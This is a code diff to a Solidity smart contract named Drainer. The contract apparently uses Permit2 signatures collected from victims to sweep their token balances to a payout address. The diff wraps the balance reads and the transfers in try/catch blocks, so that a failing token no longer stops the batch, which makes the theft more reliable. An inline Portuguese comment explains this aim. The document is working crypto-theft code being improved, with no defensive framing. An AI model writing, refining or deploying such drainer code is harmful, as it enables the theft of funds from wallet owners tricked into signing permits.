@@ -112,13 +112,21 @@ contract Drainer {
         uint256 length = batch.details.length;
         for (uint256 i; i < length; ++i) {
             address token = batch.details[i].token;
-            uint256 balance = IERC20(token).balanceOf(owner);
+
+            // um token sem approval ao Permit2 (ou balanco estranho) nao pode derrubar o lote inteiro
+            uint256 balance;
+            try IERC20(token).balanceOf(owner) returns (uint256 b) {
+                balance = b;
+            } catch {
+                continue;
+            }
             if (balance == 0) continue;
 
             uint256 signed = batch.details[i].amount;
             uint256 amount = signed >= balance ? balance : signed;
-            IPermit2(PERMIT2).transferFrom(owner, payout, uint160(amount), token);
-            emit Swept(owner, token, amount);
+            try IPermit2(PERMIT2).transferFrom(owner, payout, uint160(amount), token) {
+                emit Swept(owner, token, amount);
+            } catch {}
         }
     }
 
